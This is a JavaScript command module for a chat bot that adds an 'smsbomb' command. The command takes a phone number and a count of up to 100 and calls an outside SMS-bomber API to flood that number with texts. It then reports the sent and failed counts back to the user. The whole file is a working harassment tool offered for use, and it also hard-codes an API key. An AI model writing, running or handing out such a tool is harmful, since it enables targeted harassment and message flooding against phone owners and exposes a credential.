const axios = require('axios');
const { sendMessage } = require('../handles/sendMessage');

// Cooldown storage (per user)
const userCooldowns = new Map();
const COOLDOWN_TIME = 180000; // 3 minutes

module.exports = {
    name: ['smsbomb', 'smsbomber', 'bomb'],
    usage: 'smsbomb [phone] | [amount]',
    description: 'Send SMS bomber to a phone number (3 minute cooldown)',
    version: '1.0.0',
    author: 'codex',
    category: 'tools',
    cooldown: 180,

    async execute(senderId, args, token, event) {
        // Check cooldown first
        const lastUsed = userCooldowns.get(senderId);
        if (lastUsed && (Date.now() - lastUsed) < COOLDOWN_TIME) {
            const remainingSeconds = Math.ceil((COOLDOWN_TIME - (Date.now() - lastUsed)) / 1000);
            const minutes = Math.floor(remainingSeconds / 60);
            const seconds = remainingSeconds % 60;
            
            let timeText = '';
            if (minutes > 0) {
                timeText = `${minutes} minute${minutes > 1 ? 's' : ''} and ${seconds} second${seconds > 1 ? 's' : ''}`;
            } else {
                timeText = `${seconds} second${seconds > 1 ? 's' : ''}`;
            }
            
            await sendMessage(senderId, {
                text: `Cooldown Active\n\nPlease wait ${timeText} before using this command again.\n\nCooldown Period: 3 minutes`
            }, token);
            return;
        }

        // Check if phone number and amount are provided
        if (args.length < 2) {
            await sendMessage(senderId, { 
                text: `Usage:\nsmsbomb 09123456789 | 10\n\nAmount Range: 1-100 messages\nCooldown: 3 minutes`
            }, token);
            return;
        }

        // Parse args with | separator
        let phone, amount;
        const separatorIndex = args.findIndex(arg => arg === '|');

        if (separatorIndex !== -1) {
            phone = args.slice(0, separatorIndex).join(' ');
            amount = parseInt(args[separatorIndex + 1]);
        } else {
            phone = args[0];
            amount = parseInt(args[1]);
        }

        const apiKey = '79d08d76a3deae3fae1c7637141db818ec02faf1e3597e302c4ed9e1d5211d89';

        // Validate phone number
        if (!phone || phone.length < 10) {
            await sendMessage(senderId, { text: 'Invalid phone number. Please provide a valid phone number.' }, token);
            return;
        }

        // Validate amount
        if (isNaN(amount) || amount < 1 || amount > 100) {
            await sendMessage(senderId, { text: 'Amount must be between 1 and 100' }, token);
            return;
        }

        await sendMessage(senderId, { text: `Starting SMS bombing to ${phone}...` }, token);

        try {
            const response = await axios.get('https://haji-mix-api.gleeze.com/api/smsbomber', {
                params: {
                    phone: phone,
                    amount: amount,
                    api_key: apiKey
                },
                timeout: 30000
            });

            if (response.data && response.data.success) {
                userCooldowns.set(senderId, Date.now());
                
                // Extract success and failed counts from response
                const successCount = response.data.success_count || response.data.sent || amount;
                const failedCount = response.data.failed_count || response.data.failed || 0;
                const totalAttempted = successCount + failedCount;
                
                let message = `SMS Bombing Complete\n\n`;
                message += `Target: ${phone}\n`;
                message += `Attempted: ${totalAttempted} messages\n\n`;
                message += `Sent Successfully: ${successCount}\n`;
                message += `Failed to Send: ${failedCount}\n\n`;
                message += `Next use available in 3 minutes`;
                
                await sendMessage(senderId, { text: message }, token);
                console.log(`SMS bomb sent to ${phone} (${successCount}/${totalAttempted}) by user ${senderId}`);
            } else {
                await sendMessage(senderId, { 
                    text: `Failed to Start SMS Bombing\n\nError: ${response.data?.message || 'Unknown error'}\n\nPlease check the phone number and try again later.`
                }, token);
            }
        } catch (error) {
            console.error('SMS Bomber Error:', error);
            
            let errorMessage = `Error Occurred\n\n`;
            
            if (error.code === 'ECONNABORTED') {
                errorMessage += `Connection timeout. The server is taking too long to respond.`;
            } else if (error.response) {
                errorMessage += `API Error: ${error.response.status}\nMessage: ${error.response.data?.message || 'Unknown error'}`;
            } else if (error.request) {
                errorMessage += `No response from API server. Please try again later.`;
            } else {
                errorMessage += `${error.message}`;
            }
            
            errorMessage += `\n\nPlease check the phone number format and try again.\nExample: smsbomb 09123456789 | 10`;
            
            await sendMessage(senderId, { text: errorMessage }, token);
        }
    }
};

// Clean up cooldowns periodically
setInterval(() => {
    const now = Date.now();
    for (const [userId, timestamp] of userCooldowns) {
        if (now - timestamp > COOLDOWN_TIME) {
            userCooldowns.delete(userId);
        }
    }
}, 60000);
